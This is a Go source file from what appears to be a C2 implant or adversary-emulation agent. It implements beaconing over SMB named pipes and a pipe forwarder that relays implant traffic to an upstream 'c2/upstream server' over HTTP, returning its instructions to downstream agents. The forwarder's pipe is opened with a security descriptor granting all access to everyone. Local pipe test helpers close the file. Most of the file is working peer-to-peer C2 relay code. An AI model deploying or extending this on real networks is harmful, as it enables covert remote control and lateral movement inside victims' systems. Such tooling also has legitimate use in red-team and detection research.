package util

import (
    "bufio"
    "fmt"
    "io"
    "net"
    "encoding/json"
    "encoding/hex" // for debugging
    "time"
    "../winio"
    "../output"
)

// Send beacon to upstream pipe and return instructions.
func GetInstructionsSmb(profile map[string]interface{}) map[string]interface{} {
    data, _ := json.Marshal(profile)
    responseData := SendDataToPipe(profile["upstreamPipePath"].(string), data, true) // change to true for now

	var out map[string]interface{}

	if responseData != nil {
		output.VerbosePrint("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(responseData, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["instructions"] = commands
	} else {
		output.VerbosePrint("[-] beacon: DEAD")
	}
	return out
}

// Spin up a named pipe forwarder that listens on the specified named pipe and forwards the received data
// to the agent's c2/upstream server.
func StartNamedPipeForwarder(pipeName string, upstreamDest string, upstreamProtocol string) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
    listener, err := winio.ListenPipe(pipeName, config)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error with creating listener for pipe %s", pipeName))
        panic(err)
    }

    defer listener.Close()

	for {
        output.VerbosePrint("[*] Waiting for connection from client")
        conn, err := listener.Accept()
        if err != nil {
            output.VerbosePrint("[!] Error with accepting connection to listener.")
            panic(err)
        }
        output.VerbosePrint("[*] Connection received from client")

        pipeReader := bufio.NewReader(conn)
        pipeWriter := bufio.NewWriter(conn)

        // Read in the data.
        totalData, _ := readPipeData(pipeReader)

        // Handle data
        listenerHandlePipePayload(totalData, upstreamDest, upstreamProtocol, pipeWriter)
        conn.Close()
	}
}

// Helper function that handles data received from the named pipe by sending it to the agent's c2/upstream server.
// Will write responses into the original pipe.
func listenerHandlePipePayload(data []byte, upstreamDest string, upstreamProtocol string, pipeWriter *bufio.Writer) {
    // Placeholder debugging
    output.VerbosePrint(fmt.Sprintf("[*] Received data (hex): %s", hex.EncodeToString(data)))
    output.VerbosePrint(fmt.Sprintf("[*] Forwarding message upstream to %s via %s", upstreamDest, upstreamProtocol))

    if upstreamProtocol == "http" {
        // Hardcoded as instructions for now - TODO add flexibility
        address := fmt.Sprintf("%s/instructions", upstreamDest)
        bites := postRequest(address, data)

        if bites != nil {
            output.VerbosePrint("[+] relaying beacon: ALIVE")
            writePipeData(bites, pipeWriter)
        } else {
            output.VerbosePrint("[-] relaying beacon: DEAD")
        }
    }
}

// Sends data to pipe. If expecting data, will read back the data and return it (otherwise return nil)
func SendDataToPipe(pipePath string, data []byte, expectResponse bool) []byte {
    conn, err := winio.DialPipe(pipePath, nil)

    if err != nil {
        output.VerbosePrint(fmt.Sprintf("[!] Error dialing to pipe %s", pipePath))
        panic(err)
    }

    writer := bufio.NewWriter(conn)

    writePipeData(data, writer)

    var responseData []byte = nil

    if expectResponse {

        output.VerbosePrint("[*] Going to wait for response from upstream")
        reader := bufio.NewReader(conn)
        responseData, _ = readPipeData(reader)
    }

    conn.Close()

    return responseData
}

// Returns data and number of bytes read.
func readPipeData(pipeReader *bufio.Reader) ([]byte, int64) {
    buffer := make([]byte, 4*1024)
    totalData := make([]byte, 0)
    numBytes := int64(0)
    numChunks := int64(0)
    for {
        n, err := pipeReader.Read(buffer[:cap(buffer)])
        buffer = buffer[:n]

        if n == 0 {
            if err == nil {
                // Try reading again.
                time.Sleep(200 * time.Millisecond)
                continue
            } else if err == io.EOF {
                // Reading is done.
                output.VerbosePrint("[*] Done reading data")
                break
            } else {
                 output.VerbosePrint("[!] Error reading data from pipe")
                 panic(err)
            }
        }

        numChunks++
        numBytes += int64(len(buffer))

        // Add data chunk to current total
        totalData = append(totalData, buffer...)

        if err != nil && err != io.EOF {
             output.VerbosePrint("[!] Error reading data from pipe")
             panic(err)
        }
    }

    // Data has been read from pipe
    output.VerbosePrint(fmt.Sprintf("[*] Read in %d chunks, %d bytes from pipe", numChunks, numBytes))

    return totalData, numBytes
}

func writePipeData(data []byte, pipeWriter *bufio.Writer) {
    n, err := pipeWriter.Write(data)

    if err != nil {
        output.VerbosePrint("[!] Error writing data to pipe")
        panic(err)
    }

    err = pipeWriter.Flush()
	if err != nil {
	    output.VerbosePrint("[!] Error flushing data to pipe")
		panic(err)
	}

    output.VerbosePrint(fmt.Sprintf("[*] Wrote %d bytes to pipe", n))
}

// TESTING FUNCTIONS

// Inspired by and adapted from https://github.com/microsoft/go-winio/blob/master/pipe_test.go

// Test reading from and writing to specified named pipe, all within local machine.
func TestLocalListenDialReadWrite(testPipeName string) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
        //SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)(A;;GA;;;S-1-5-7)",
    }
	l, err := winio.ListenPipe(testPipeName, config)
	if err != nil {
		panic(err)
	}
	defer l.Close()

	ch := make(chan int)
	go testAuxServer(l, ch)

	c, err := winio.DialPipe(testPipeName, nil)
	if err != nil {
		panic(err)
	}
	defer c.Close()

	rw := bufio.NewReadWriter(bufio.NewReader(c), bufio.NewWriter(c))
	_, err = rw.WriteString("exit\n")
	if err != nil {
		panic(err)
	}
	err = rw.Flush()
	if err != nil {
		panic(err)
	}

	s, err := rw.ReadString('\n')
	if err != nil {
		panic(err)
	}
	ms := "got exit\n"
	if s != ms {
		panic(fmt.Sprintf("[!] expected '%s', got '%s'", ms, s))
	}

	<-ch
}

// Listens on pipe, repeats what was read. Loops until sender sends "exit\n".
func TestListenDialReadWrite(testPipeName string) {
    config := &winio.PipeConfig{
        SecurityDescriptor: "D:(A;;GA;;;S-1-1-0)", // File all access to everyone.
    }
	l, err := winio.ListenPipe(testPipeName, config)

	if err != nil {
		panic(err)
	}
	defer l.Close()

	ch := make(chan int)
	go testAuxServer(l, ch)
	<-ch
}

// Helper function that reads data from pipe and sends it back
func testAuxServer(l net.Listener, ch chan int) {
	c, err := l.Accept()
	if err != nil {
		panic(err)
	}
	rw := bufio.NewReadWriter(bufio.NewReader(c), bufio.NewWriter(c))

	for {
	    s, err := rw.ReadString('\n')
        if err != nil {
            panic(err)
        }
        output.VerbosePrint(fmt.Sprintf("[*] Received string: %s", s))
        output.VerbosePrint(fmt.Sprintf("[*] Length: %d", len(s)))
        _, err = rw.WriteString("[*] got " + s)
        if err != nil {
            panic(err)
        }
        err = rw.Flush()
        if err != nil {
            panic(err)
        }

        if s == "exit" || s == "exit\r\n" || s == "exit\n" {
            break;
        }

        time.Sleep(200 * time.Millisecond)
	}

	c.Close()
	ch <- 1
}